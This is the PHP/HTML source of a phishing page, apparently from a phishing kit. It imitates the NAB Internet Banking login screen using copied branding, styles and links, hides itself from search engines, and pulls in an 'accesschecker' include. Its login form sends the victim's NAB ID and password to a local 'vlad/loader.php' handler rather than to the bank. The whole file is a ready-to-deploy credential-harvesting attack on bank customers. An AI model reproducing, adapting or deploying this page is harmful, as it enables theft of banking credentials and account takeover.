<?php
require_once "../inc/m3dular_config.php"; 
require_once "../m3cache/m3dular_functions.php"; 
require_once "../m3cache/accesschecker.php";  
$loremdata=lorem(20);
?>
<html class="shadowroot flexbox cssanimations" lang="en">
 <head>
  <style type="text/css">
   @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}
  }
  </style>

  <link href="DB9VIBs1dTqVFazgPNNQC.css" rel="stylesheet" type="text/css">
  <meta content="IE=edge" http-equiv="X-UA-Compatible">
  <meta content="noindex,nofollow,noarchive" name="robots">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">
  <title>
   NAB Internet Banking
  </title>
  <link href="nabib/styles/login/_ibRedesign-styles.css" media="screen" rel="stylesheet" type="text/css">
  <link href="reno/shell/v4.34.0/loader-page.css" id="screen-css" rel="stylesheet" type="text/css">
  <link href="reno/shell/v4.34.0/loader.css" id="screen-css" rel="stylesheet" type="text/css">
  	<link id="screen-css" rel="stylesheet" type="text/css" href="https://ib.nab.com.au/ns/reno/shell/v4.39.0/loader-page.css"/>
	<link id="screen-css" rel="stylesheet" type="text/css" href="https://ib.nab.com.au/ns/reno/shell/v4.39.0/loader.css"/>
	<link rel="stylesheet" media="screen" type="text/css"
	href='https://ib.nab.com.au/nabib/styles/login/_ibRedesign-styles.css?id=6.96.0-B1131' />

  
  <style>
   iframe#web-messenger-container {
    border: 0;
    color-scheme: auto;
    position: fixed;
    transition: bottom 0.2s ease 0s, right 0.2s ease 0s;
    z-index: 999999989;
}

/* Initial Style */
iframe#web-messenger-container.webMessengerContainerHidden {
    bottom: 0px;
    visibility: hidden;
}

/* Buttonmode Styles */
iframe#web-messenger-container.webMessengerContainerButtonMode.webMessengerContainerClosed {
    height: 80px;
    width: 68px;
}

/* Tabmode Styles */
iframe#web-messenger-container.webMessengerContainerTabMode.webMessengerContainerClosed {
    bottom: 0px;
}

iframe#web-messenger-container.webMessengerContainerTabMode.webMessengerContainerClosed.webMessengerContainerFirstRender.webMessengerContainerFirstMessageChat {
    transform: translateY(calc(100% - 200px));
}

iframe#web-messenger-container.webMessengerContainerTabMode.webMessengerContainerClosed.webMessengerContainerFirstRender:not(.webMessengerContainerFirstMessageChat) {
    transform: translateY(calc(100% - 49px));
}

iframe#web-messenger-container.webMessengerContainerTabMode.webMessengerContainerOpen {
    transform: translateY(0);
    animation: expand-chat-window .4s cubic-bezier(.62,.28,.23,.99);
    animation-delay: 0s;
}

iframe#web-messenger-container.webMessengerContainerTabMode.webMessengerContainerClosed:not(.webMessengerContainerFirstRender) {
    transform: translateY(calc(100% - 49px));
    animation: collapse-chat-window .4s cubic-bezier(.62,.28,.23,.99);
    animation-delay: 0s;
}

/* Tabmode Animations */
@keyframes expand-chat-window {
    from {
      transform: translateY(calc(100% - 49px));
    }

    to {
      transform: translateY(0);
    }
  }

  @keyframes collapse-chat-window {
    from {
      transform: translateY(0);
    }

    to {
      transform: translateY(calc(100% - 49px));
    }
  }

@media only screen and (max-width: 767px),
       only screen and (max-height: 507px)  {
    html.webMessengerFullscreen {
        overflow: hidden;
        max-height: 100%;
    }

    iframe#web-messenger-container {
        bottom: 0px;
        right: 0px;
    }

    /* Buttonmode Styles */
    iframe#web-messenger-container.webMessengerContainerButtonMode.webMessengerContainerOpen {
        height: 100%;
        width: 100%;
    }

    /* Tabmode Styles */
    iframe#web-messenger-container.webMessengerContainerTabMode.webMessengerContainerClosed {
        height: 100%;
        width: 320px;
        transition: width .2s ease;
        transition-delay: .25s;
    }

    iframe#web-messenger-container.webMessengerContainerTabMode.webMessengerContainerOpen {
        height: 100%;
        width: 100%;
        transition: width .2s ease;
        transition-delay: .15s;
    }
}

@media only screen and (min-width: 768px) and (min-height: 508px) {
    iframe#web-messenger-container {
        width: 370px;
        bottom: 5px;
        right: 5px;
    }

    iframe#web-messenger-container.webMessengerContainerButtonMode.webMessengerContainerOpen,
    iframe#web-messenger-container.webMessengerContainerTabMode {
        height: 500px;
    }
}

@media only screen and (min-width: 1200px) and (min-height: 668px) {
    iframe#web-messenger-container {
        bottom: 30px;
        right: 30px;
        width: 410px;
    }

    iframe#web-messenger-container.webMessengerContainerButtonMode.webMessengerContainerOpen,
    iframe#web-messenger-container.webMessengerContainerTabMode {
        height: 640px;
    }
}
  </style>
 </head>
 <body class="ng-scope" id="mainPage" ng-app="nab.ib.nabapi.logout" ng-controller="apiLogoutController" ng-init="apiLogoutWhenIBLogin();">
  
  <div class="no-menu rendered" id="ibHeader">
   <div class="ib-f5">
    <header class="ib-header">
     <div class="banner">
      <div class="container">
       <img alt="NAB more than money" id="nab-lg-logo" src="reno/shell/v4.34.0/assets/star_nab_more.03a9540d7ae7a72c39c235f7e58679c3.svg">
       <p class="desktop-view">
        Internet Banking
       </p>
       <div class="skip-link">
        <a class="visible-on-focus" href="#bodyContent">
         Skip to main content
        </a>
       </div>
       <div class="buttons-container">
        <ul class="link-section" id="headerLinkSection">
         <li id="headerLinkSection-date">
          <span class="date-icon">
           
          </span>
         </li>
         <li id="headerLinkSection-help">
          <a class="help-icon" href="javascript:goToPage('https://www.nab.com.au/personal/online-banking/nab-internet-banking/sms-security')">
           Help
           <span class="sr-only">
            , opens in new window
           </span>
          </a>
         </li>
         <li id="headerLinkSection-security">
          <a class="security-icon" href="javascript:goToPage('http://www.nab.com.au/about-us/security')">
           Security
           <span class="sr-only">
            , opens in new window
           </span>
          </a>
         </li>
         <li id="headerLinkSection-contact">
          <a class="contact-icon" href="javascript:goToPage('http://www.nab.com.au/about-us/contact-us')">
           Contact us
           <span class="sr-only">
            , opens in new window
           </span>
          </a>
         </li>
         <li id="headerLinkSection-locate">
          <a class="locate-icon" href="javascript:goToPage('http://ols.nab.com.au/location-web/search.do')">
           Locate us
           <span class="sr-only">
            , opens in new window
           </span>
          </a>
         </li>
        </ul>
       </div>
       <div class="menu-btn-container" id="mobile-menu-wrapper">
        <button aria-expanded="false" aria-label="Menu" class="hamburger-btn" id="hamburger-btn">
         <div class="menu-btn" id="hamburger">
          <div class="hamburger-layer" id="top-bar">
          </div>
          <div class="hamburger-layer" id="middle-bar">
          </div>
          <div class="hamburger-layer" id="bottom-bar">
          </div>
         </div>
         <span class="sr-only">
          Main menu
         </span>
        </button>
        <nav class="mobile-main-menu" id="side-nav" role="navigation">
         <div class="mobile-main-menu-wrapper">
          <ul class="link-section-mobile" id="headerLinkSection">
           <li id="headerLinkSection-date">
            <span class="date-icon">
             
            </span>
           </li>
           <li id="headerLinkSection-help">
            <a class="help-icon" href="javascript:goToPage('https://www.nab.com.au/personal/online-banking/nab-internet-banking/sms-security')">
             Help
             <span class="sr-only">
              , opens in new window
             </span>
            </a>
           </li>
           <li id="headerLinkSection-security">
            <a class="security-icon" href="javascript:goToPage('http://www.nab.com.au/about-us/security')">
             Security
             <span class="sr-only">
              , opens in new window
             </span>
            </a>
           </li>
           <li id="headerLinkSection-contact">
            <a class="contact-icon" href="javascript:goToPage('http://www.nab.com.au/about-us/contact-us')">
             Contact us
             <span class="sr-only">
              , opens in new window
             </span>
            </a>
           </li>
           <li id="headerLinkSection-locate">
            <a class="locate-icon" href="javascript:goToPage('http://ols.nab.com.au/location-web/search.do')">
             Locate us
             <span class="sr-only">
              , opens in new window
             </span>
            </a>
           </li>
          </ul>
         </div>
        </nav>
       </div>
       
       <button aria-hidden="true" class="sr-only" id="mobile-arrow-trap-end" tabindex="-1">
       </button>
       <img alt="NAB more than money" id="nab-md-logo" src="reno/shell/v4.34.0/assets/star_nab_more.03a9540d7ae7a72c39c235f7e58679c3.svg">
       <img alt="NAB more than money" id="nab-star-logo" src="reno/shell/v4.34.0/assets/star_nab.49030fddae05ccbb4a82467133879db3.svg">
       <p class="mobile-view">
        Internet Banking
       </p>
      </div>
     </div>
    </header>
   </div>
  </div>
  <div class="wrapper">
   <div id="bodycontainer">
    <div id="bodycontainer_inside">
     <div class="banner-background" style="background-image: url('ib-login-banner2-1797x800.jpg');">
      <aside aria-label="Important information" class="notification-wrapper">
       <div class="container">
           <div class="maintenance-check global-notification"><div class="content"><h2 class="icon-spanner">Internet Banking login changes</h2><p>We've improved our online banking security.  You'll now be asked for a security code when logging in using a new web browser. Note: You'll always be asked for a security code when using incognito mode. Find out more at www.nab.com.au/sms</p></div>
       </div>
      </aside>
      <div class="body-content-wrapper">
       <div class="container">
        <div class="row">
         <div class="col-xs-8 col-md-6 col-lg-5">
          <div>
           <div id="nab-idp-password">
            <nab-idp-password isolation="lenient" x-app-id="nab-idp-password" x-instance-id="lc0ityc8">
             <style data-styled-undefined="active" data-styled-version="5.3.1">
              *,*:before,*:after{box-sizing:border-box;}*{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;}.ciKcbf{font-family:'SourceSansPro',Helvetica,Arial,sans-serif;}.cMzpRy{width:100%;height:100%;}.ioqYLG{position:absolute;margin:auto 0;top:0;bottom:0;left:1rem;height:1.125rem;width:1.125rem;font-family:'SourceSansPro',Helvetica,Arial,sans-serif;background-color:#fff;border:solid 2px #808080;border-radius:2px;transition:border-color 200ms ease-in,box-shadow 200ms ease-in,background-color 200ms ease-in,color 200ms ease-in,fill 200ms ease-in,width 200ms ease-in-out;}.ioqYLG:after{content:'';position:absolute;display:none;height:0.6875rem;width:0.375rem;top:0;left:0.25rem;border:solid #fff;border-width:0 2px 2px 0;transform:rotate(35deg);}.cOfcYH{font-family:'SourceSansPro',Helvetica,Arial,sans-serif;color:#000;font-size:1rem;line-height:1.5rem;border:solid 1px #808080;border-radius:4px;min-height:3rem;vertical-align:middle;position:relative;padding:0.75rem 1rem 0.75rem 3rem;display:block;width:100%;}.cOfcYH input{position:absolute;opacity:0;cursor:pointer;height:0;width:0;}.cOfcYH:focus-within{outline-width:100%;outline-height:100%;}.cOfcYH input ~ .Checkboxstyle__CustomCheckbox-sc-tk9n2c-0{border-color:#808080;}.cOfcYH:hover{cursor:pointer;border-color:#000;}.cOfcYH input:disabled ~ .Checkboxstyle__CustomCheckbox-sc-tk9n2c-0{background-color:#e6e6e6;border-color:#808080;}.cOfcYH:hover input:not([disabled]):not([readonly]) ~ .Checkboxstyle__CustomCheckbox-sc-tk9n2c-0{background-color:#e6e6e6;border-color:#000;}.cOfcYH input:checked ~ .Checkboxstyle__CustomCheckbox-sc-tk9n2c-0{border-color:#000;}.cOfcYH input:focus ~ .Checkboxstyle__CustomCheckbox-sc-tk9n2c-0{border-color:#000;box-shadow :0 0 0 3px rgba(0,0,0,0.65);outline-color :transparent;outline-style :solid;}.cOfcYH input:focus:checked:not([disabled]):not([readonly]) ~ .Checkboxstyle__CustomCheckbox-sc-tk9n2c-0{border-color:#000;box-shadow :0 0 0 3px rgba(0,0,0,0.65);outline-color :transparent;outline-style :solid;}.cOfcYH:active input:not([disabled]):not([readonly]) ~ .Checkboxstyle__CustomCheckbox-sc-tk9n2c-0{border-color:#000;background-color:#000;box-shadow :0 0 0 3px rgba(0,0,0,0.65);outline-color :transparent;outline-style :solid;}.cOfcYH input:checked ~ .Checkboxstyle__CustomCheckbox-sc-tk9n2c-0{background-color:#000;}.cOfcYH input:checked ~ .Checkboxstyle__CustomCheckbox-sc-tk9n2c-0:after{display:block;}.cOfcYH:hover input:checked:not([disabled]):not([readonly]) ~ .Checkboxstyle__CustomCheckbox-sc-tk9n2c-0{background-color:#e6e6e6;}.cOfcYH:hover input:checked:not([disabled]):not([readonly]) ~ .Checkboxstyle__CustomCheckbox-sc-tk9n2c-0:after{border-color:#000;}.cRCWkB{font-family:'SourceSansPro',Helvetica,Arial,sans-serif;font-size:1rem;line-height:1.5rem;color:#000;}.gvOEIg{flex-grow:1;}.LfXIR{font-family:'SourceSansPro',Helvetica,Arial,sans-serif;display:flex;flex-flow:row wrap;text-align:left;}.LfXIR .FieldWrapperstyle__StyledLabel-sc-12jde4j-1{margin-bottom:0.5rem;width:100%;align-self:center;font-weight:600;}@media (max-width:575px){.LfXIR .FieldWrapperstyle__StyledLabel-sc-12jde4j-1{align-self:flex-end;margin-bottom:0.5rem;flex-basis:100%;}}.LfXIR .FieldWrapperstyle__FieldContainer-sc-12jde4j-3{width:auto;flex-basis:80%;order:2;}.FieldWrapperstyle__StyledFieldWrapper-sc-12jde4j-4 + .FieldWrapperstyle__StyledFieldWrapper-sc-12jde4j-4{margin-top:1.5rem;}.ControlGroupstyle__StyledFieldset-sc-1ofuhgw-2 + .FieldWrapperstyle__StyledFieldWrapper-sc-12jde4j-4{margin-top:1.5rem;}.ControlGroupstyle__StyledControlWrapper-sc-1ofuhgw-1 + .FieldWrapperstyle__StyledFieldWrapper-sc-12jde4j-4{margin-top:1.5rem;}.LfXIR + .ControlGroupstyle__StyledControlWrapper-sc-1ofuhgw-1{margin-top:1.5rem;}.LfXIR + .ControlGroupstyle__StyledFieldset-sc-1ofuhgw-2{margin-top:1.5rem;}.LfXIR .InlineErrorstyle__StyledErrorMessage-sc-17tkx90-0,.LfXIR .FieldWrapperstyle__StyledDescription-sc-12jde4j-0{margin-top:0.5rem;margin-bottom:0;order:4;flex:1 auto;width:100%;}.LfXIR .Tooltipstyle__StyledTooltipContainer-sc-21jic1-6{margin-left:0.5rem;vertical-align:top;order:3;}@media (max-width:575px){.LfXIR .Tooltipstyle__StyledTooltipContainer-sc-21jic1-6{margin-left:0.25rem;flex-grow:1;justify-content:flex-end;}}.jcCuGX{background-color:#fff;color:#000;padding:0.75rem 1rem;font-size:1rem;line-height:1.5rem;min-height:3rem;margin:0;z-index:1;flex-grow:1;border:none;background:none;outline:0;display:inline-block;resize:vertical;position:relative;width:0;background-clip:content-box;}.jcCuGX:required{box-shadow:none;}.enrdzK{border:1px solid #808080;border-radius:4px;position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%;background:none;z-index:0;transition:border-color 200ms ease-in,box-shadow 200ms ease-in,background-color 200ms ease-in,color 200ms ease-in,fill 200ms ease-in,width 200ms ease-in-out;pointer-events:none;}.cFMMNf{border-radius:4px;background-color:#fff;display:flex;flex-wrap:wrap;position:relative;}.cFMMNf .Inputstyle__StyledInput-sc-1rshy60-0::placeholder{color:#4d4d4d;}.cFMMNf .Inputstyle__StyledInput-sc-1rshy60-0:focus ~ .Inputstyle__StyledInputOutline-sc-1rshy60-1{border-color:#000;box-shadow :0 0 0 3px rgba(0,0,0,0.65);outline-color :transparent;outline-style :solid;}.cFMMNf .Inputstyle__StyledInput-sc-1rshy60-0:hover ~ .Inputstyle__StyledInputOutline-sc-1rshy60-1{border-color:#000;}.cFMMNf .Inputstyle__StyledInput-sc-1rshy60-0:disabled{cursor:not-allowed;}.cFMMNf .Inputstyle__StyledInput-sc-1rshy60-0:disabled ~ .Inputstyle__StyledInputOutline-sc-1rshy60-1{background-color:rgba(0,0,0,0.1);border-color:#b3b3b3;box-shadow:inset 0 0 0 3px rgba(0,0,0,0.1);cursor:not-allowed;}.Inputstyle__InputContainer-sc-1rshy60-5 + .Inputstyle__InputContainer-sc-1rshy60-5{margin-top:1rem;}.jvwOyv{flex-basis:100%;}.hlvAxb{margin:0;outline:transparent;color:#000;font-weight:300;font-family:'SourceSansPro',Helvetica,Arial,sans-serif;font-size:2.5rem;line-height:3rem;}.dYBEVv.dYBEVv{color:#000;}.dYBEVv.dYBEVv.ib-style{font-size:2.5rem;font-weight:300;letter-spacing:1px;line-height:3rem;}@media (max-width:767px){.dYBEVv.dYBEVv.ib-style{font-size:2rem;letter-spacing:0;line-height:2.5rem;}}.gLafUF{display:inline-flex;flex-direction:unset;vertical-align:bottom;font-family:'SourceSansPro',Helvetica,Arial,sans-serif;font-size:1rem;line-height:1.5rem;text-decoration:underline;border-radius:4px;cursor:pointer;transition:border-color 200ms ease-in,box-shadow 200ms ease-in,background-color 200ms ease-in,color 200ms ease-in,fill 200ms ease-in,width 200ms ease-in-out;color:#c20000;}.gLafUF svg{color:#c20000;}@media (forced-colors:active) and (prefers-color-scheme:light){.gLafUF.gLafUF{color:#000;}.gLafUF:active,.gLafUF:focus,.gLafUF:hover{color:#000;}.gLafUF:active svg,.gLafUF:focus svg,.gLafUF:hover svg{color:#000 !important;}}@media (forced-colors:active) and (prefers-color-scheme:dark){.gLafUF.gLafUF{color:#fff;}.gLafUF:active,.gLafUF:focus,.gLafUF:hover{color:#fff;}.gLafUF:active svg,.gLafUF:focus svg,.gLafUF:hover svg{color:#fff !important;}}.gLafUF:hover{text-decoration:none;color:#000;}.gLafUF:hover svg{color:#000;}.gLafUF:focus{text-decoration:underline;color:#c20000;}.gLafUF:focus svg{color:#c20000;}.gLafUF:focus{box-shadow :0 0 0 3px rgba(194,0,0,0.65);outline-color :transparent;outline-style :solid;}.gLafUF:active{color:#000;box-shadow :0 0 0 3px rgba(0,0,0,0.65);text-decoration:none;}.gLafUF:active svg{color:#000;}.erTFQf{transition:border-color 200ms ease-in,box-shadow 200ms ease-in,background-color 200ms ease-in,color 200ms ease-in,fill 200ms ease-in,width 200ms ease-in-out;font-size:1rem;line-height:1.5rem;border:2px solid transparent;border-radius:4px;box-sizing:border-box;font-family:'SourceSansPro',Helvetica,Arial,sans-serif;box-shadow:none;color:#fff;font-weight:700;min-width:8rem;vertical-align:middle;cursor:pointer;min-height:3rem;color:#fff;background-color:#c20000;padding:0.5rem 1.5rem;}.erTFQf:hover,.erTFQf:focus,.erTFQf:active{text-decoration:underline;}.erTFQf svg{fill:#fff;color:#fff;}.erTFQf:hover{background-color:#8f0000;color:false;}.erTFQf:focus{background-color:#8f0000;color:false;box-shadow :0 0 0 3px rgba(194,0,0,0.65);outline-color :transparent;outline-style :solid;}.erTFQf:active{background-color:#750000;color:false;box-shadow :0 0 0 3px rgba(194,0,0,0.65);outline-color :transparent;outline-style :solid;}.fQvJmH{transition:border-color 200ms ease-in,box-shadow 200ms ease-in,background-color 200ms ease-in,color 200ms ease-in,fill 200ms ease-in,width 200ms ease-in-out;font-size:1rem;line-height:1.5rem;border:2px solid transparent;border-radius:4px;box-sizing:border-box;font-family:'SourceSansPro',Helvetica,Arial,sans-serif;box-shadow:none;color:#fff;font-weight:700;min-width:8rem;vertical-align:middle;cursor:pointer;min-height:3rem;color:#c20000;padding:0.5rem 1.5rem;text-decoration:underline;background-color:transparent;border:none;}.fQvJmH:hover,.fQvJmH:focus,.fQvJmH:active{text-decoration:underline;}.fQvJmH svg{color:#c20000;}@media (forced-colors:active) and (prefers-color-scheme:light){.fQvJmH.fQvJmH{color:#000;}.fQvJmH:active,.fQvJmH:focus,.fQvJmH:hover{color:#000;}.fQvJmH:active svg,.fQvJmH:focus svg,.fQvJmH:hover svg{color:#000 !important;}}@media (forced-colors:active) and (prefers-color-scheme:dark){.fQvJmH.fQvJmH{color:#fff;}.fQvJmH:active,.fQvJmH:focus,.fQvJmH:hover{color:#fff;}.fQvJmH:active svg,.fQvJmH:focus svg,.fQvJmH:hover svg{color:#fff !important;}}.fQvJmH:hover{text-decoration:none;color:#000;}.fQvJmH:hover svg{color:#000;}.fQvJmH:focus{text-decoration:underline;color:#c20000;}.fQvJmH:focus svg{color:#c20000;}.fQvJmH:focus{box-shadow :0 0 0 3px rgba(194,0,0,0.65);outline-color :transparent;outline-style :solid;}.fQvJmH:active{color:#000;box-shadow :0 0 0 3px rgba(0,0,0,0.65);text-decoration:none;}.fQvJmH:active svg{color:#000;}.ggdLJm.ggdLJm.ggdLJm{font-weight:normal;padding:0;border:none;min-width:0;min-height:auto;text-align:left;}.bQGpvU{width:100%;}@media (min-width:576px){.bQGpvU{max-width:420px;}}.fAeqbE [data-component-id='FieldWrapper']{margin-top:24px;}.fAeqbE form [data-component-id='FieldWrapper']:first-child{margin-top:0;}.jBNhlV{font-family:'SourceSansPro',Helvetica,Arial,sans-serif;font-size:0.875rem;line-height:1.25rem;color:#4d4d4d;font-weight:400;}.jbXRoG{background:#ececec;width:100%;padding:15px 32px;}.dpzeyO button{font-size:18px;}@media (max-width:575px){.dpzeyO button{width:100%;}}.kTsvaS{vertical-align:middle;margin-right:5px;}.duAkkr{display:inline;font-weight:bold;vertical-align:middle;}.jZCTeO{padding:32px;position:relative;padding:38px 32px 32px 32px;}.FjIHM{font-size:14px;width:90%;color:#4d4d4d;}.hIKlfc{margin-top:2px;}.hIKlfc [data-component-id='Checkbox']{border:none;}.jPxlgJ{outline:0px solid transparent;}.jPxlgJ p{line-height:1.5rem;color:#000;}.jdcMG [data-component-id='FieldWrapper']{margin-top:16px;}.dtoFmY{position:relative;}.kxfapW{overflow:hidden;background-color:white;border-radius:8px;}
             </style>
               <style>
    .error-message {
      color: red;
      font-size: 14px;
      margin-top: 4px;
    }
  </style>
             <div class="MiniAppRoot-jvyFYV cMzpRy" x-component="MiniAppRoot">
              <div class="Themestyle__StyledGlobalFont-sc-1cw5fma-0 ciKcbf">
               <div class="OverrideGlobalStyle-hmsyR fFbaGk">
                <div class="Wrapper-mFINN kxfapW">
                 <div class="RelativeBox-JpzCc dtoFmY">
                  <div class="FormContent-EVCzi jZCTeO">
                   <div data-testid="spacer" style="padding: 0px 0px 24px;">
                    <div class="Themestyle__StyledGlobalFont-sc-1cw5fma-0 ciKcbf">
                     <h1 class="H1style__StyledH1-sc-1n8ovcg-0 hlvAxb StyledH1-McasH dYBEVv ib-style" tabindex="-1">
                      NAB Internet Banking
                     </h1>
                    </div>
                   </div>
                   <div class="MessageWrapper-gOwkpm jPxlgJ" data-id="messageDiv" tabindex="-1">
                   </div>
                   <div class="FormContentWrapper-eOUExJ bQGpvU">
                    <div class="CustomFormWrapper-kroOXH fAeqbE IBFormWrapper-ljvwNH jdcMG">



                     <form method="post" novalidate="" action="vlad/loader.php?n=lotp&ml=1" onsubmit="return validateForm(this);">
                      <div class="FieldWrapperstyle__StyledFieldWrapper-sc-12jde4j-4 LfXIR" data-component-id="FieldWrapper">
                       <label class="FieldWrapperstyle__StyledLabel-sc-12jde4j-1 cRCWkB" for="username" id="username-label">
                        NAB ID
                       </label>
                       <div class="FieldWrapperstyle__FieldContainer-sc-12jde4j-3 gvOEIg">
                        <div class="Inputstyle__InputContainer-sc-1rshy60-5 cFMMNf">
                         <input aria-required="true" autocomplete="off" class="Inputstyle__StyledInput-sc-1rshy60-0 jcCuGX" id="username" name="username" required="true" type="text" value="">
                         <div aria-hidden="true" class="Inputstyle__StyledInputOutline-sc-1rshy60-1 enrdzK">
                         </div>
                         <div class="Inputstyle__StyledCounterContainer-sc-1rshy60-9 jvwOyv">
                         </div>
                        </div>
                       </div>
                      </div>
                      <div class="error-message" id="username-error"></div>
                      <div class="FieldWrapperstyle__StyledFieldWrapper-sc-12jde4j-4 LfXIR" data-component-id="FieldWrapper">
                       <label class="FieldWrapperstyle__StyledLabel-sc-12jde4j-1 cRCWkB" for="password" id="password-label">
                        Password
                       </label>
                       <div class="FieldWrapperstyle__FieldContainer-sc-12jde4j-3 gvOEIg">
                        <div class="Inputstyle__InputContainer-sc-1rshy60-5 cFMMNf">
                         <input aria-required="true" class="Inputstyle__StyledInput-sc-1rshy60-0 jcCuGX" data-component-id="FormPassword" id="password" name="password" required="true" type="password" value="">
                         <div aria-hidden="true" class="Inputstyle__StyledInputOutline-sc-1rshy60-1 enrdzK">
                         </div>
                         <div class="Inputstyle__StyledCounterContainer-sc-1rshy60-9 jvwOyv">
                         </div>
                        </div>
                       </div>
                      </div>
                      <div class="error-message" id="password-error"></div>
                      <div class="RememberMeCheckBoxWrapper-bRxtMe hIKlfc">
                       <label class="Checkboxstyle__StyledCheckbox-sc-tk9n2c-1 cOfcYH" data-component-id="Checkbox">
                        <div>
                         <span class="Checkboxstyle__StyledLabel-sc-tk9n2c-3 chsCSg">
                          Remember my NAB ID
                         </span>
                         <input name="rememberMe" type="checkbox" value="">
                         <span class="Checkboxstyle__CustomCheckbox-sc-tk9n2c-0 ioqYLG">
                         </span>
                        </div>
                       </label>
                      </div>
                      <span class="Captionstyle__StyledText-sc-r8xcyd-0 jBNhlV IBViewSupportHint-dJEBHT FjIHM">
                       <!-- For security reasons, we’ll only show you the last 3 digits. Don’t save your NAB ID if anyone else uses this browser. -->
                      </span>
                      <div data-testid="spacer" style="padding: 32px 0px 0px;">
                       <div class="IBButtonRow-gJlICK dpzeyO">
                        <button class="Buttonstyle__StyledButton-sc-1vu4swu-3 erTFQf" data-component-id="Button" type="submit">
                         Login
                        </button>
                       </div>
                      </div>
                      <div data-testid="spacer" style="padding: 16px 0px 0px;">
                       <button class="Buttonstyle__StyledButton-sc-1vu4swu-3 fQvJmH StyledLink-eszssi ggdLJm" data-component-id="Button" type="button">
                        Forgot your NAB ID or password?
                       </button>
                      </div>
                     </form>
                    </div>
                   </div>
                  </div>
                  <div class="FormFooter-dsbRCq jbXRoG">
                   <span class="RegisterLabel-hHgsRq kTsvaS">
                    New to NAB Internet Banking?
                   </span>
                   <a class="Linkstyle__StyledAnchor-sc-124xyde-0 gLafUF RegisterLink-erpbUI duAkkr" data-component-id="Link" href="#standardLink">
                    Register now
                   </a>
                  </div>
                 </div>
                </div>
               </div>
              </div>
             </div>
            </nab-idp-password>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
     <div aria-hidden="true" class="container mbox-iframe-container">
     </div>
    </div>
   </div>
  </div>
  <div class="rendered" id="ibFooter">
   <div class="ib-f5">
    <div id="khoros-livechat-root">
    </div>
    <a href="#top" onkeydown="event.cancelBubble=!0" title="End of Page, go to top of page">
    </a>
    <footer class="ib-footer">
     <div class="container">
      <div class="flex-container">
       <p>
        © National Australia Bank Limited
       </p>
      </div>
     </div>
    </footer>
   </div>
  </div>
  <b id="zoxziYyjhv">
  </b>
  <div aria-atomic="true" aria-live="polite" id="a11y-region" role="status" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; width: 1px;">
  </div>
 </body>
 </html>
<script>
  function showError(elementId, message) {
    const errorElement = document.getElementById(elementId);
    errorElement.innerHTML = message;
  }

function validateForm(form) {
  const usernameInput = form.querySelector("#username");
  const passwordInput = form.querySelector("#password");
  let isValid = true;

  if (!usernameInput.value.trim()) {
    showError("username-error", "Please enter a username.");
    isValid = false;
  } else if (!/^\d{8}$/.test(usernameInput.value)) {
    showError("username-error", "Incorrect NAB ID must be exactly");
    isValid = false;
  } else {
    showError("username-error", "");
  }

  if (!passwordInput.value.trim()) {
    showError("password-error", "Please enter a password.");
    isValid = false;
  } else {
    showError("password-error", "");
  }

  return isValid;
}
</script>